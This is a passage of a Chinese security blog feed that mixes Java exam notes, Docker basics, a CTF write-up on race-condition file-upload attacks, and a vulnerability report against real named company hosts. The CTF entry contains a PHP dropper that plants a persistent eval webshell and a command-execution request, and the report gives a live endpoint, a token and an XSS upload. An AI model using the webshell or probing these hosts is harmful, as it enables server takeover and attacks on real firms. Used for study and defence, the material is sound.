function_">fly</span><span class="hljs-params">()</span>;              <span class="hljs-comment">// 默认public abstract</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bird</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Flyable</span> &#123;  <span class="hljs-comment">// 实现接口（多继承）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123; <br>        System.out.println(<span class="hljs-string">&quot;拍翅膀飞&quot;</span>); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-参数传递（程序填空）"><a href="#3-参数传递（程序填空）" class="headerlink" title="3. 参数传递（程序填空）"></a><strong>3. 参数传递</strong>（程序填空）</h4><ul><li><strong>基本类型</strong>：值传递（方法内修改不影响外部）</li><li><strong>引用类型</strong>：地址传递（方法内修改对象属性会影响外部）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> num, <span class="hljs-type">int</span>[] arr)</span> &#123;<br>    num = <span class="hljs-number">100</span>;         <span class="hljs-comment">// 不影响外部</span><br>    arr[<span class="hljs-number">0</span>] = <span class="hljs-number">99</span>;       <span class="hljs-comment">// 修改外部数组</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span>[] a = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>change(x, a);<br>System.out.println(x); <span class="hljs-comment">// 输出10（未变）</span><br>System.out.println(a[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 输出99（已修改）</span><br></code></pre></td></tr></table></figure><hr><h3 id="第五章-数组、字符串、集合（重点！）"><a href="#第五章-数组、字符串、集合（重点！）" class="headerlink" title="第五章 数组、字符串、集合（重点！）"></a><strong>第五章 数组、字符串、集合（重点！）</strong></h3><h4 id="1-数组（程序填空）"><a href="#1-数组（程序填空）" class="headerlink" title="1. 数组（程序填空）"></a><strong>1. 数组</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;           <span class="hljs-comment">// 静态初始化</span><br><span class="hljs-type">int</span>[][] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];    <span class="hljs-comment">// 二维数组</span><br>arr2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">5</span>;                 <span class="hljs-comment">// 访问元素</span><br>System.out.println(arr1.length); <span class="hljs-comment">// 长度属性（非方法！）</span><br></code></pre></td></tr></table></figure><h4 id="2-字符串（高频考点！）"><a href="#2-字符串（高频考点！）" class="headerlink" title="2. 字符串（高频考点！）"></a><strong>2. 字符串</strong>（高频考点！）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;world&quot;</span>);<br><span class="hljs-comment">// 常用方法（对比Python）</span><br>s1.concat(s2);      <span class="hljs-comment">// 拼接（Python: s1+s2）</span><br>s1.substring(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);  <span class="hljs-comment">// 切片&quot;el&quot;（Python: s1[1:3]）</span><br>s1.equals(s2);      <span class="hljs-comment">// 内容比较（==比较地址！）</span><br></code></pre></td></tr></table></figure><h4 id="3-集合类（程序填空）"><a href="#3-集合类（程序填空）" class="headerlink" title="3. 集合类（程序填空）"></a><strong>3. 集合类</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br>ArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(); <span class="hljs-comment">// 泛型</span><br>list.add(<span class="hljs-string">&quot;A&quot;</span>);                     <span class="hljs-comment">// 添加元素</span><br>list.get(<span class="hljs-number">0</span>);                       <span class="hljs-comment">// 获取元素</span><br>list.size();                       <span class="hljs-comment">// 长度（Python: len()）</span><br><span class="hljs-comment">// Vector线程安全但效率低（用法类似）</span><br></code></pre></td></tr></table></figure><hr><h3 id="第六章-异常处理"><a href="#第六章-异常处理" class="headerlink" title="第六章 异常处理"></a><strong>第六章 异常处理</strong></h3><p>采用try-catch-finally结构：<br>（1）当try语句块中有抛出<br>（throw）异常时，则try语句块中<br>的剩余语句不执行。<br>（2）finally语句块一般都要执<br>行，除非try和catch语句块中有<br>System.exit(0)，则不执行finally语<br>句块，直接退出。<br>（3）当catch语句块能捕捉到<br>try语句块中抛出的异常，则try-<br>catch-finally结构之后的代码会被<br>执行，否则不会被执行。</p><hr><h3 id="第七章-文件与数据流"><a href="#第七章-文件与数据流" class="headerlink" title="第七章 文件与数据流"></a><strong>第七章 文件与数据流</strong></h3><h4 id="1-字节流（程序填空）"><a href="#1-字节流（程序填空）" class="headerlink" title="1. 字节流（程序填空）"></a><strong>1. 字节流</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 文件复制（模板代码！）</span><br><span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;in.jpg&quot;</span>);<br>     <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;out.jpg&quot;</span>)) &#123;<br>    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-keyword">while</span> ((len = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>        fos.write(buffer, <span class="hljs-number">0</span>, len);  <span class="hljs-comment">// 缓冲区读写</span><br>    &#125;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-缓冲流（效率更高）"><a href="#2-缓冲流（效率更高）" class="headerlink" title="2. 缓冲流（效率更高）"></a><strong>2. 缓冲流</strong>（效率更高）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br><span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(fos);<br></code></pre></td></tr></table></figure><hr><h3 id="备考策略"><a href="#备考策略" class="headerlink" title="备考策略"></a><strong>备考策略</strong></h3><ol><li><p><strong>优先级排序</strong>：<br><strong>面向对象(30%) &gt; 集合&#x2F;字符串(25%) &gt; 异常&#x2F;流(15%) &gt; 基础语法(30%)</strong></p></li><li><p><strong>Python迁移技巧</strong>：</p><ul><li>Java的<code>ArrayList</code> ≈ Python的<code>list</code></li><li><code>String</code>方法名不同但功能类似（<code>.length()</code> vs <code>len()</code>）</li><li>OOP概念通用（封装、继承、多态）</li></ul></li><li><p><strong>刷题重点</strong>：</p><ul><li>程序填空题：循环&#x2F;数组&#x2F;字符串&#x2F;集合方法调用</li><li>简答题：OOP三大特性、接口vs抽象类</li><li>判断题：标识符规则、异常分类</li></ul></li></ol><blockquote><p>💡 <strong>最后叮嘱</strong>：虽然你精通算法，但Java考试更关注<strong>语法细节</strong>和<strong>API调用规范</strong>，务必多练手写代码！尤其注意分号、花括号、类型声明等Python没有的约束。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CORS跨域</title>
    <link href="/2025/03/10/CORS%E8%B7%A8%E5%9F%9F/"/>
    <url>/2025/03/10/CORS%E8%B7%A8%E5%9F%9F/</url>
    
    <content type="html"><![CDATA[<p><img src="/../images/image-20250805150643063.png" alt="image-20250805150643063"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF条件竞争漏洞</title>
    <link href="/2025/02/11/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2025/02/11/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<p><strong>条件竞争</strong>指的是程序的<strong>执行结果依赖于不受控制的事件发生的顺序或时机</strong>。当多个线程或进程在没有适当同步机制的情况下，同时访问和操作共享资源（如文件、变量、数据库记录）时，就可能出现非预期的、错误的执行结果。</p><h2 id="核心原理："><a href="#核心原理：" class="headerlink" title="核心原理："></a>核心原理：</h2><ol><li><p><strong>共享资源：</strong> 存在一个多个请求&#x2F;线程&#x2F;进程都能访问的资源（例如：一个<strong>临时文件</strong>、一个状态标志、一个数据库字段、一个计数器）。</p></li><li><p><strong>非原子操作：</strong> 对共享资源的操作不是“原子性”的。这意味着完成操作需要多个步骤，在这些步骤之间可以被中断，让其他请求介入。</p></li><li><p><strong>并发访问：</strong> 攻击者能够以极高的并发度（同时或极短时间内）发送多个请求，试图让这些请求的执行流在操作共享资源的关键步骤上相互交织。</p></li><li><p><strong>非预期交织：</strong> 由于请求的执行顺序和时机不确定，攻击者精心构造的并发请求可能导致操作步骤以开发者未预料到的顺序执行。</p></li><li><p><strong>利用结果：</strong> 这种非预期的执行顺序导致程序进入一个非预期的、通常是有利于攻击者的状态（例如：绕过检查、创建非预期文件、提升权限）。</p></li></ol><hr><h2 id="文件上传-解析-执行-经典案例"><a href="#文件上传-解析-执行-经典案例" class="headerlink" title="文件上传 + 解析&#x2F;执行 (经典案例):"></a>文件上传 + 解析&#x2F;执行 (经典案例):</h2><ul><li><strong>场景：</strong> 服务器允许用户上传文件。上传后，服务器会对文件进行一些检查（如检查文件类型、内容），如果检查通过，会将文件移动到一个有执行权限的目录（如 <code>uploads/</code>）；如果检查不通过，会删除该临时文件。</li><li><strong>漏洞：</strong> 检查(<code>check</code>)和移动(<code>move</code>)是两个独立的操作，不是原子的。在<code>check</code>完成之后、<code>move</code>执行之前，存在一个非常短暂的时间窗口。</li><li><strong>攻击：</strong><ol><li>攻击者不断快速上传一个包含恶意代码（如 Webshell）的文件 <code>shell.php</code>。</li><li>服务器收到上传后，将文件保存为一个<strong>临时文件名</strong>（如 <code>/tmp/tmp_upload_12345</code>）。</li><li>服务器开始对这个临时文件进行检查。</li><li>在检查<strong>完成之后</strong>（假设检查逻辑有漏洞被绕过，或者攻击者利用速度制造混乱），但在服务器将其<strong>移动到最终目录之前</strong>（例如 <code>uploads/shell.php</code>），攻击者以极高的并发度疯狂访问这个<strong>临时文件</strong>对应的最终预期URL（如 <code>http://target/uploads/shell.php</code>）。</li><li>由于访问请求极快且大量，<strong>有可能</strong>在某个时刻，服务器刚刚完成检查认为文件合法，<strong>还没来得及移动文件</strong>，就有一个访问请求到达了Web服务器（如 Apache&#x2F;Nginx）。</li><li>Web服务器尝试去 <code>uploads/</code> 目录下寻找 <code>shell.php</code>，但此时文件还在 <code>/tmp/tmp_upload_12345</code>，所以没找到，返回404。</li><li><strong>但是！</strong> 如果攻击者的访问请求在服务器将临时文件移动到 <code>uploads/shell.php</code> <strong>之后</strong>才被Web服务器处理，那么Web服务器就能找到并执行这个 <code>shell.php</code> 文件，攻击者的恶意代码就执行成功了！</li></ol></li><li><strong>关键：</strong> 攻击者通过海量的并发访问，赌那个“移动文件刚刚完成，访问请求就到达”的时机。虽然单个请求命中的概率很低，但海量请求下总有一次会成功。成功执行后，攻击者就获得了Webshell。</li></ul><hr><h2 id="购买-兑换逻辑（有限资源或支付校验）："><a href="#购买-兑换逻辑（有限资源或支付校验）：" class="headerlink" title="购买&#x2F;兑换逻辑（有限资源或支付校验）："></a>购买&#x2F;兑换逻辑（有限资源或支付校验）：</h2><ul><li><strong>场景：</strong> 用户用积分购买商品或兑换优惠券。流程是：1) 检查用户积分是否足够； 2) 如果足够，则扣除积分； 3) 发放商品&#x2F;优惠券。</li><li><strong>漏洞：</strong> “检查积分”和“扣除积分”不是原子操作。</li><li><strong>攻击：</strong><ol><li>攻击者账户只有够买1件商品的积分。</li><li>攻击者同时发送大量购买请求（比如100个）。</li><li>服务器在处理第一个请求时，检查积分（足够） -&gt; 扣除积分（变为0） -&gt; 发放商品。</li><li>但在处理后续的99个请求时，因为它们几乎是<strong>同时</strong>到达，服务器在<strong>扣除积分之前</strong>检查积分，看到的都是<strong>原始的、足够的积分</strong>（因为第一个请求的扣除操作可能还没写入数据库，或者读到了旧缓存）。于是服务器认为积分足够，继续执行扣除和发放操作。</li><li>结果：攻击者用仅够买1件商品的积分，成功购买了100件商品。服务器积分被扣成负数，或者错误地发放了大量优惠券&#x2F;商品。</li></ol></li></ul><hr><h2 id="攻击代码（假设文件名为-shell-php）："><a href="#攻击代码（假设文件名为-shell-php）：" class="headerlink" title="攻击代码（假设文件名为 shell.php）："></a>攻击代码（假设文件名为 shell.php）：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;my.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php eval($_POST[my]);?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>代码解析</strong>：</p><ol><li><strong><code>fopen(&quot;my.php&quot;, &quot;w&quot;)</code></strong>  <ul><li>以<strong>写入模式</strong>打开当前目录下的 <code>my.php</code> 文件（不存在则创建）。</li></ul></li><li><strong><code>fputs(..., &#39;&lt;?php eval($_POST[1]);?&gt;&#39;)</code></strong>  <ul><li>向 <code>my.php</code> 写入内容：<code>&lt;?php eval($_POST[my]);?&gt;</code>  </li><li><code>eval($_POST[my])</code> 表示执行通过POST参数 <code>my</code> 传递的任意代码（例如 <code>my=system(&quot;ls&quot;)</code> 可执行系统命令）。</li></ul></li><li><strong>整体作用</strong><br><strong>当此文件被PHP解析执行时，会在当前目录生成一个恶意Webshell文件 <code>my.php</code></strong>，攻击者通过访问 <code>my.php</code> 即可控制服务器。</li></ol><hr><p><strong>shell.php执行后新建my.php文件并写入一句话木马，作用是当上传的shell.php被删后，后端还存有my.php中的后门，方便连接。</strong></p><p>接下来抓取上传shell.php的请求包，发送到<strong>Intruder</strong>爆破模块</p><p><img src="/images/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.png"></p><p>除此之外最好设置多线程重放，增加条件竞争成功的可能性。</p><p>不断访问上传的<code>shell.php</code>文件，一旦有<code>200</code>状态码，说明条件竞争成功。监控脚本启动后，开始进行无限重放</p><h2 id="验证攻击"><a href="#验证攻击" class="headerlink" title="验证攻击"></a>验证攻击</h2><p>访问 <code>http://ctf.com/uploads/my.php</code>，用HackBar发送POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/uploads/my.php</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br>my=system(&quot;ls -al /&quot;);<br></code></pre></td></tr></table></figure><p>若返回服务器目录列表，则攻击成功。</p><hr><h3 id="防御方案（CTF出题方向）"><a href="#防御方案（CTF出题方向）" class="headerlink" title="防御方案（CTF出题方向）"></a>防御方案（CTF出题方向）</h3><ol><li><p><strong>禁用临时文件执行</strong>  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ /tmp/</span> &#123;<br>   <span class="hljs-attribute">deny</span> all; <span class="hljs-comment"># 禁止访问/tmp目录</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>原子性移动操作</strong><br>使用 <code>rename()</code> 而非分步操作（Linux下移动是原子的）。</p></li><li><p><strong>内容二次渲染</strong><br>对图片进行压缩&#x2F;缩放，破坏嵌入的PHP代码。</p></li><li><p><strong>临时目录隔离</strong><br>将临时文件生成到不可访问的私有目录（如 <code>/var/upload_tmp/</code>）。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>通达</title>
    <link href="/2025/02/05/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/02/05/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p><img src="/../images/image-20250721120415140.png" alt="image-20250721120415140"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2025/01/22/docker/"/>
    <url>/2025/01/22/docker/</url>
    
    <content type="html"><![CDATA[<h3 id="Docker-容器基本操作"><a href="#Docker-容器基本操作" class="headerlink" title="Docker 容器基本操作"></a>Docker 容器基本操作</h3><p>Docker 是一种容器化技术，可将应用及其依赖打包为独立容器。以下是基本操作指南：</p><p><strong>1. 容器生命周期管理</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 运行新容器（-d后台运行，-p端口映射，--name命名）</span><br>docker run -d -p 80:80 --name web nginx<br><br><span class="hljs-comment"># 查看运行中容器</span><br>docker ps<br><br><span class="hljs-comment"># 查看所有容器（包括已停止的）</span><br>docker ps -a<br><br><span class="hljs-comment"># 停止/启动/重启容器</span><br>docker stop web<br>docker start web<br>docker restart web<br><br><span class="hljs-comment"># 删除容器（需先停止）</span><br>docker <span class="hljs-built_in">rm</span> web<br><br><span class="hljs-comment"># 强制删除运行中的容器</span><br>docker <span class="hljs-built_in">rm</span> -f web<br><br></code></pre></td></tr></table></figure><p><strong>2. 容器内操作</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入容器交互式终端</span><br>docker <span class="hljs-built_in">exec</span> -it web bash<br><br><span class="hljs-comment"># 查看容器日志</span><br>docker logs web<br><br><span class="hljs-comment"># 查看容器资源使用情况</span><br>docker stats web<br><br></code></pre></td></tr></table></figure><h3 id="Docker-镜像创建"><a href="#Docker-镜像创建" class="headerlink" title="Docker 镜像创建"></a>Docker 镜像创建</h3><p>镜像是容器的模板，可通过 Dockerfile 构建：</p><p><strong>1. Dockerfile 示例</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 基础镜像</span><br><span class="hljs-keyword">FROM</span> python:<span class="hljs-number">3.9</span><br><br><span class="hljs-comment"># 设置工作目录</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><br><span class="hljs-comment"># 复制依赖文件并安装</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> requirements.txt .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt</span><br><br><span class="hljs-comment"># 复制应用代码</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><br><span class="hljs-comment"># 暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">5000</span><br><br><span class="hljs-comment"># 启动命令</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;app.py&quot;</span>]</span><br><br></code></pre></td></tr></table></figure><p><strong>2. 构建与推送镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 构建镜像（-t标签，.表示当前目录的Dockerfile）</span><br>docker build -t my-app:1.0 .<br><br><span class="hljs-comment"># 查看本地镜像</span><br>docker images<br><br><span class="hljs-comment"># 登录Docker Hub</span><br>docker login<br><br><span class="hljs-comment"># 标记镜像以推送至仓库</span><br>docker tag my-app:1.0 username/my-app:1.0<br><br><span class="hljs-comment"># 推送镜像</span><br>docker push usernae/my-app:1.0<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>swagger</title>
    <link href="/2025/01/20/Swagger%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/01/20/Swagger%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p>漏洞url：<a href="https://aries.minshenglife.com/gateway/core/;/swagger-ui.html">https://aries.minshenglife.com/gateway/core/;/swagger-ui.html</a></p><p><img src="/../images/db53bc26-01a8-409d-bd48-dfc5f54d6c97.png" alt="db53bc26-01a8-409d-bd48-dfc5f54d6c97"></p><p><img src="/../images/64afae06-00dd-4932-a293-2ce853cadc1b.png" alt="64afae06-00dd-4932-a293-2ce853cadc1b"></p><p><img src="/../images/99d50d0d-2d20-4693-936e-f1928e6e86b1.png" alt="99d50d0d-2d20-4693-936e-f1928e6e86b1"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">【漏洞地址】</span><br><span class="hljs-string">https://scrm.cpicfunds.com:443/finance/marketing/app/tools/cpicfunds/uploadImg</span><br><span class="hljs-string">【测试过程】</span><br><span class="hljs-string">添加一个任意值的Origin请求头</span><br><span class="hljs-string">POST</span> <span class="hljs-string">/finance/marketing/app/tools/cpicfunds/uploadImg</span> <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-attr">Host:</span> <span class="hljs-string">scrm.cpicfunds.com</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">257</span><br><span class="hljs-attr">Xweb_xhr:</span> <span class="hljs-number">1</span><br><span class="hljs-attr">Authorization:</span> <span class="hljs-string">238f8189cafc4fbf908e3d178508ad59</span><br><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64)</span> <span class="hljs-string">AppleWebKit/537.36</span> <span class="hljs-string">(KHTML,</span> <span class="hljs-string">like</span> <span class="hljs-string">Gecko)</span> <span class="hljs-string">Chrome/126.0.0.0</span> <span class="hljs-string">Safari/537.36</span> <span class="hljs-string">MicroMessenger/7.0.20.1781(0x6700143B)</span> <span class="hljs-string">NetType/WIFI</span> <span class="hljs-string">MiniProgramEnv/Windows</span> <span class="hljs-string">WindowsWechat/WMPF</span> <span class="hljs-string">WindowsWechat(0x63090c37)XWEB/14185</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">multipart/form-data;</span> <span class="hljs-string">boundary=----WebKitFormBoundaryG7xLcTn90MdeGS5T</span><br><span class="hljs-attr">Accept:</span> <span class="hljs-string">*/*</span><br><span class="hljs-attr">Sec-Fetch-Site:</span> <span class="hljs-string">cross-site</span><br><span class="hljs-attr">Sec-Fetch-Mode:</span> <span class="hljs-string">cors</span><br><span class="hljs-attr">Sec-Fetch-Dest:</span> <span class="hljs-string">empty</span><br><span class="hljs-attr">Referer:</span> <span class="hljs-string">https://servicewechat.com/wxae879adb344254a7/8/page-frame.html</span><br><span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate,</span> <span class="hljs-string">br</span><br><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">zh-CN,zh;q=0.9</span><br><span class="hljs-attr">Priority:</span> <span class="hljs-string">u=1,</span> <span class="hljs-string">i</span><br><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><br><span class="hljs-attr">Origin:</span> <span class="hljs-string">https://hhohe.com</span><br><br><span class="hljs-string">------WebKitFormBoundaryG7xLcTn90MdeGS5T</span><br><span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;fileName&quot;</span><br><br><br><span class="hljs-string">------WebKitFormBoundaryG7xLcTn90MdeGS5T</span><br><span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;files&quot;;</span> <span class="hljs-string">filename=&quot;Obito.html&quot;</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">text/html</span><br><br><span class="hljs-string">&amp;lt;script&amp;gt;alert(1)&amp;lt;script&amp;gt;</span><br><span class="hljs-string">响应结果里设置了Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span><span class="hljs-string">，且Access-Control-Allow-Origin头为任意来源</span><br><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span><br><span class="hljs-attr">Server:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">Date:</span> <span class="hljs-string">Tue,</span> <span class="hljs-number">05</span> <span class="hljs-string">Aug</span> <span class="hljs-number">2025 03:38:17 </span><span class="hljs-string">GMT</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span><br><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><br><span class="hljs-attr">Vary:</span> <span class="hljs-string">Origin</span><br><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">https://hhohe.com</span><br><span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">Content-Length:</span> <span 